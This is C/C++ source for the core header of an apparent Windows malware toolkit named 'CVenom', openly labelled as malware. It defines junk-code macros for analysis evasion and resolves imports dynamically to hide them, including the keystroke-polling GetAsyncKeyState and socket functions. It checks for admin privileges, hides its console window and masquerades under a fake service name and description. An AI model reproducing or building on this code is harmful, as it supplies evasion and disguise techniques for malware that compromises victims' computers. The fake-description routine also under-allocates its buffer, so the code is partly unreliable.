// Some Macros.

#define SUCCEED		0
#define PROBLEM 	1
#define ADMIN		0
#define USER		1
#define OK		0
#define DONE		0
#define FAILED  	1
#define FILE_EXIST	1
#define FILE_NOT_FOUND  0
#define ON  		1
#define OFF 		0
#define ERROR           1
#define ERROR_SUCCESS	0

#define FUNCTION_EVADE int x

#define MALWARE_ENTRY int argc, char** argv
#define MALWARE_INIT  argc, argv

#define MALWARE_EXIT 0x00

#define KEEP_PID	0
#define CHANGE_PID	0x99

#define PAMAX	4096

#define	LINUX	0x05
#define WINDOWS	0x06

#define KB *1000
#define MB *1000000
#define GB *1000000000
#define TB *1000000000000

#define THREAD_ENTRY DWORD WINAPI
#define THREAD       LPVOID thrd
#define HIGH_PRIVILEGES     ADMIN
#define LOW_PRIVILEGES      USER


int xc_5xw, xx5xcf4s, m5al4o6, _junkcodex5j;

#define JunkCodeExecution xc_5xw=1+1+2+4*5/5/6/9+2+4%6-9; xx5xcf4s=xc_5xw%4+2+3*5%5-5/5; m5al4o6=xx5xcf4s/xc_5xw+xx5xcf4s%9*8*7/6-5+4;  _junkcodex5j=1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+1+8/7/4-5*5-4+3+100-100/100+100-100+100-100+100-100+100-100+7/5%5
//#define _CRT_SECURE_NO_WARNINGS
//#define _CRT_NONSTDC_NO_DEPRECATE
//#define WIN32_LEAN_AND_MEAN

// Headers To Include
#include <iostream>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <thread>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <psapi.h>
#include <signal.h>
#include <shellapi.h>
#include <windows.h>
#include <winioctl.h>
#include <winnt.h>
#include <winerror.h>
#include <windef.h>
// Accessing Some Functions From Different Namespaces.
using		std::string;
using       	std::remove;

// Custom Data Types And Typedefs

//typedef void (*function)(int);
typedef __p_sig_fn_t function;
typedef long (WINAPI* RtlSetProcessIsCritical)(
			IN  BOOLEAN	bNew,
			OUT BOOLEAN*	pbOld,
			IN  BOOLEAN	bNeedScb);
typedef struct membuf{
        char*  data;
        size_t size;
	int location=0;
}MemoryBuffer;



struct c_malware_stat__t{
	char	name[PAMAX + 1];
	char	fakename[156];
	char*	fakedescription = NULL;

	int	privileges;

	size_t  size;
};

// Dynamic API Function Resolving (Hiding Imports)

HMODULE ws2 = LoadLibraryW(L"ws2_32.dll");

HMODULE us32 = GetModuleHandleW(L"user32.dll");
HMODULE hk32 = GetModuleHandleW(L"kernel32.dll");

typedef SHORT(WINAPI *PGetAsyncKeyState)(int);
typedef   int(WSAAPI *PWSAStartup)(IN WORD, OUT LPWSADATA);
typedef   int(WSAAPI *PWSACleanup)();
typedef   int(WSAAPI *Pclosesocket)(SOCKET);
typedef   int(WSAAPI *Pconnect)(SOCKET, struct sockaddr*, int);
typedef   int(WSAAPI *Pbind)(SOCKET, const sockaddr*, int);
typedef   struct hostent*(WSAAPI *Pgethostbyname)(const char*);
typedef   u_short(WSAAPI *Phtons)(u_short);
typedef   unsigned long(WSAAPI *Pinet_addr)(const char*);
typedef   char*(WSAAPI *Pinet_ntoa)(struct in_addr);
typedef   SOCKET(WSAAPI *Psocket)(int, int, int);
typedef   int (WSAAPI *Psend)(SOCKET, const char*, int, int);
typedef   int (WSAAPI *Precv)(SOCKET, char*, int, int);
typedef   int (WSAAPI *Precvfrom)(SOCKET, char*, int, int, struct sockaddr*, int*);
typedef   int (WSAAPI *Psendto)(SOCKET, const char*, int, int, const struct sockaddr*, int);
typedef   int (WSAAPI *Psetsockopt)(SOCKET, int, int, const char*, int);
typedef   int (WSAAPI *Plisten)(SOCKET, int);
typedef   int (WSAAPI *Paccept)(SOCKET, struct sockaddr*, int*);

PGetAsyncKeyState funcGetAsyncKeyState = (PGetAsyncKeyState)GetProcAddress(us32, "GetAsyncKeyState");

PWSAStartup    funcWSAStartup    = (PWSAStartup)    GetProcAddress(ws2, "WSAStartup");
PWSACleanup    funcWSACleanup    = (PWSACleanup)    GetProcAddress(ws2, "WSACleanup");
Pclosesocket   funcclosesocket   = (Pclosesocket)   GetProcAddress(ws2, "closesocket");
Pconnect       funcconnect       = (Pconnect)       GetProcAddress(ws2, "connect");
Pbind          funcbind          = (Pbind)          GetProcAddress(ws2, "bind");
Pgethostbyname funcgethostbyname = (Pgethostbyname) GetProcAddress(ws2, "gethostbyname");
Phtons         funchtons         = (Phtons)         GetProcAddress(ws2, "htons");
Pinet_addr     funcinet_addr     = (Pinet_addr)     GetProcAddress(ws2, "inet_addr");
Pinet_ntoa     funcinet_ntoa     = (Pinet_ntoa)     GetProcAddress(ws2, "inet_ntoa");
Psocket        funcsocket        = (Psocket)        GetProcAddress(ws2, "socket");
Psend	       funcsend		 = (Psend)	    GetProcAddress(ws2, "send");
Precv	       funcrecv		 = (Precv)	    GetProcAddress(ws2, "recv");
Precvfrom      funcrecvfrom	 = (Precvfrom)      GetProcAddress(ws2, "recvfrom");
Psendto	       funcsendto	 = (Psendto)	    GetProcAddress(ws2, "sendto");
Psetsockopt    funcsetsockopt	 = (Psetsockopt)    GetProcAddress(ws2, "setsockopt");
Plisten	       funclisten	 = (Plisten)        GetProcAddress(ws2, "listen");
Paccept	       funcaccept	 = (Paccept)	    GetProcAddress(ws2, "accept");


//*************************************

// Global Data For Some CVenom's Functionalities.
char**				_argv__;
int				_argc__;

struct c_malware_stat__t 	Current;
struct c_malware_stat__t*	MALWARE;



int RPCheck(){
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	b = AllocateAndInitializeSid(
	    &NtAuthority,
	    2,
	    SECURITY_BUILTIN_DOMAIN_RID,
	    DOMAIN_ALIAS_RID_ADMINS,
	    0, 0, 0, 0, 0, 0,
	    &AdministratorsGroup);
	if(b)
	{
	    if (!CheckTokenMembership( NULL, AdministratorsGroup, &b)) 
	    {
	         b = FALSE;
	    }
	    FreeSid(AdministratorsGroup);
	}

	return !b;
}

// Some Functions For Initializing The Library.
void Show(int d){
	printf("Value: %d\n", d);
}
void cvinit(int argc, char** argv){
//	HANDLE fh;

	_argv__=argv;
	_argc__=argc;
	MALWARE=&Current;

//	Current.size=GetFileSize(fh, NULL);

	strncpy(Current.name, argv[0], PAMAX);
	strncpy(Current.fakename, "SystemOptimizer", 155);
	Current.privileges=RPCheck();

//	CloseHandle(fh);

	return;
}


void SetMalwareMode(int mode){
	if (mode == ON){
		HWND   wh;

		AllocConsole();
		wh=FindWindow("ConsoleWindowClass", NULL);
		ShowWindow(wh, 0x00);
	}
}

void SetMalwareFakeService(const char* name){
	strncpy(Current.fakename, name, 155);
}
void SetMalwareFakeDescription(const char* desc){
	if (Current.fakedescription){
		free(Current.fakedescription);
	}

	Current.fakedescription=(char*)malloc(strlen(desc));
	strcpy(Current.fakedescription, desc);
}

void cvexit(int x){
	if (Current.fakedescription)
		free(Current.fakedescription);
	exit(x);
}
